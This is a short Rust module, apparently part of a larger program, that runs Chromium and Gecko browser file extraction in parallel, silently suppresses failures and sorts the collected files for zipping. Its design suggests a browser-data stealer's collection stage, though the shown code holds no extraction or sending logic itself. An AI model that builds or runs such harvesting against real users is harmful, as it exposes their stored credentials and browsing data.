pub mod chromium;
pub mod gecko;
pub mod common;

use std::panic;
use crate::dbg_log;

pub fn run() -> Vec<(String, String)> {
    dbg_log!("browsers::run BEGIN");
    let mut all_files: Vec<(String, String)> = Vec::new();

    let gecko_handle = std::thread::spawn(|| gecko::extract_all());
    let chromium_files = panic::catch_unwind(|| chromium::extract_all()).unwrap_or_default();
    let gecko_files = gecko_handle.join().unwrap_or_default();

    dbg_log!("browsers::run chromium={} gecko={}", chromium_files.len(), gecko_files.len());

    all_files.extend(chromium_files);
    all_files.extend(gecko_files);

    common::zipp::sort_entries(&mut all_files);

    dbg_log!("browsers::run total files={}", all_files.len());
    all_files
}
